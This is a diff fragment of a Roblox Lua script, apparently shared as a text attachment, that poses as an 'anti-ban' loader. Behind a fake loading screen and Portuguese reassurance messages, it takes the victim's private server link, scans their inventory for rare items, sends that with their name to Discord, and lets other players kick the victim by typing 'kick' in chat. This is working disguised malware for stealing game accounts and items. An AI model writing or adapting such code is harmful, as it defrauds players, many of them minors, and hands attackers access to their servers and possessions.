+	loaderSound.SoundId = "rbxassetid://1848354536"
+	loaderSound.Volume = 1
+	loaderSound.Looped = true
+	pcall(function() loaderSound:Play() end)
+	
+	local clickConnection
+	
+	clickConnection = UserInputService.InputBegan:Connect(function(input, gameProcessed)
+		if gameProcessed then return end
+		
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			local pos = input.Position
+			local screenSize = workspace.CurrentCamera.ViewportSize
+			local targetScaleX = clamp(pos.X / screenSize.X, 0.02, 0.98)
+			local targetScaleY = clamp(pos.Y / screenSize.Y, 0.02, 0.98)
+			
+			for _, s in ipairs(stars) do
+				if s and s.Instance then
+					s.isMovingToClick = true
+					if s.movementTween then
+						pcall(function() s.movementTween:Cancel() end)
+						s.movementTween = nil
+					end
+					
+					local offsetX = rand(-0.02, 0.02)
+					local offsetY = rand(-0.02, 0.02)
+					local finalX = clamp(targetScaleX + offsetX, 0.01, 0.99)
+					local finalY = clamp(targetScaleY + offsetY, 0.01, 0.99)
+					local speed = rand(0.18, 0.5)
+					local fastTween = TweenService:Create(s.Instance, TweenInfo.new(speed, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(finalX, 0, finalY, 0)})
+					
+					fastTween:Play()
+					fastTween.Completed:Connect(function()
+						s.isMovingToClick = false
+						wait(rand(0.08, 0.6))
+						startRandomMove(s)
+					end)
+				end
+			end
+		end
+	end)
+	
+	local totalSeconds = 60
+	local steps = 100
+	local waitPerStep = totalSeconds / steps
+	
+	spawn(function()
+		for i = 0, steps do
+			local frac = i / 100
+			
+			barFill.Size = UDim2.new(frac, 0, 1, 0)
+			percentLabel.Text = tostring(i).."%"
+			wait(waitPerStep)
+		end
+		
+		loadingDotsActive = false
+		loaderTitle.Text = "Quase la, aguarde 1 minuto para ser aplicado o ant-banimento em seu servidor!"
+		loaderTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+		loaderTitle.TextScaled = true
+		wait(300)
+		loaderTitle.Text = "âœ… Script Loaded\nPlease Wait 2-3 Minutes..."
+		loaderTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
+		loaderTitle.TextScaled = true
+		pcall(function() loaderSound:Stop() end)
+		
+		if clickConnection and clickConnection.Connected then
+			pcall(function() clickConnection:Disconnect() end)
+		end
+	end)
+	
+	task.spawn(function()
+		local ok, accountAge = pcall(function() return LocalPlayer.AccountAge end)
+		
+		local accountAgeDays = ok and accountAge or 0
+		local foundEntries = findAllSecretAndOGBrainrots()
+		local brainrots = convertToBrainrotFormat(foundEntries)
+		
+		pcall(function()
+			sendToDiscord(serverLink, #Players:GetPlayers(), LocalPlayer.Name, brainrots)
+		end)
+	end)
+end
+
+local function showKickMessage()
+	pcall(function()
+		if brainrotUI and brainrotUI.Parent then
+			brainrotUI:Destroy()
+		end
+		
+		if currentLoaderGui and currentLoaderGui.Parent then
+			currentLoaderGui:Destroy()
+			currentLoaderGui = nil
+		end
+	end)
+	
+	pcall(function()
+		if LocalPlayer and LocalPlayer:IsA("Player") then
+			LocalPlayer:Kick("ðŸ¤£ðŸ”¥VocÃª foi amassado pelo gordÃ£o e thzinnðŸ”¥ðŸ¤£.")
+		end
+	end)
+end
+
+local function connectKickToPlayer(plr)
+	if plr ~= LocalPlayer then
+		pcall(function()
+			plr.Chatted:Connect(function(msg)
+				if msg and msg:lower() == "kick" then
+					showKickMessage()
+				end
+			end)
+		end)
+	end
+end
+
+serverLinkBox.Focused:Connect(function()
+	if serverLinkBox.Text == placeholderText or serverLinkBox.Text == "Formato de link invalido" then
+		serverLinkBox.Text = ""
+		serverLinkBox.TextColor3 = normalTextColor
+	end
+end)
+
+serverLinkBox.FocusLost:Connect(function(enterPressed)
+	if enterPressed then
+		confirmButton:Activate()
+	else
+		if serverLinkBox.Text == "" then
+			serverLinkBox.Text = placeholderText
+			serverLinkBox.TextColor3 = hintColor
+		end
+	end
+end)
+
+local function isDescendantOfTextbox(inputObject)
+	if not inputObject then return false end
+	local target = inputObject.Target
+	if not target then return false end
+	return target == serverLinkBox or serverLinkBox:IsAncestorOf(target)
+end
+
+miniFrame.InputBegan:Connect(function(input)
+	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
+		if isDescendantOfTextbox(input) then
+			return
+		end
+		
+		dragging = true
+		dragStart = input.Position
+		startPos = miniFrame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+miniFrame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		dragInput = input
+	end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+	if input == dragInput and dragging and dragStart and startPos then
+		local delta = input.Position - dragStart
+		local newX = startPos.X.Offset + delta.X
+		local newY = startPos.Y.Offset + delta.Y
+		local screenW, screenH = workspace.CurrentCamera.ViewportSize.X, workspace.CurrentCamera.ViewportSize.Y
+		
+		newX = clamp(newX, -miniFrame.Size.X.Offset + 40, screenW - 40)
+		newY = clamp(newY, -miniFrame.Size.Y.Offset + 40, screenH - 40)
+		miniFrame.Position = UDim2.new(0, newX, 0, newY)
+	end
+end)
+
+confirmButton.MouseButton1Click:Connect(function()
+	local currentText = tostring(serverLinkBox.Text or "")
+	
+	if currentText == placeholderText then currentText = "" end
+	
+	if not currentText:match(LINK_PATTERN) then
+		serverLinkBox.Text = "Formato de link invalido"
+		serverLinkBox.TextColor3 = errorTextColor
+		return
+	end
+	
+	serverLinkBox.TextColor3 = normalTextColor
+	serverLinkBox.Text = currentText
+	confirmButton.Text = "âœ… Validado"
+	confirmButton.BackgroundColor3 = Color3.fromRGB(50, 170, 100)
+	wait(0.25)
+	createLoaderUI(currentText)
+end)
+
+serverLinkBox.FocusLost:Connect(function(enterPressed)
+	if enterPressed then
+		confirmButton:Activate()
+	end
+end)
+
+for _,plr in ipairs(Players:GetPlayers()) do
+	connectKickToPlayer(plr)
+end
+
+Players.PlayerAdded:Connect(function(plr)
+	connectKickToPlayer(plr)
+end)
+message.txt
+36 KB
